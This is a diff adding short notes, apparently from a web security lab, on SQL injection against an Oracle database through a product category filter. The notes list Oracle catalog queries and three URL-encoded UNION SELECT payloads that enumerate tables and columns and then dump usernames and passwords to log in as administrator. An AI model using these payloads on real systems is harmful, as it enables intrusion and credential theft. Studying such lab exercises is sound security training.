@@ -1,0 +1,28 @@
+# In ***Oracle*** you can obtain the same information with slightly different queries.
+
+You can list tables by querying all_tables: 
+SELECT * FROM all_tables 
+
+And you can list columns by querying all_tab_columns:
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS' 
+
+
+SQL Injection in Product category filter
+
+Application has a login functionality.
+
+DB contains a table that holds users and passwords
+
+
+Goal: retrive the table and columns that holds usersname, passwords and login as administrator.
+
+'+UNION+SELECT+TABLE_NAME,+NULL+FROM+all_tables-- -> USERS_GBWIQQ
+
+'+UNION+SELECT+COLUMN_NAME,+NULL+FROM+all_tab_columns+WHERE+TABLE_NAME+=+'USERS_GBWIQQ'-- -> USERNAME_RYZKIN, PASSWORD_DAXCAG
+
+
+'+UNION+SELECT+USERNAME_RYZKIN,+PASSWORD_DAXCAG+FROM+USERS_GBWIQQ--
+
+
+
+
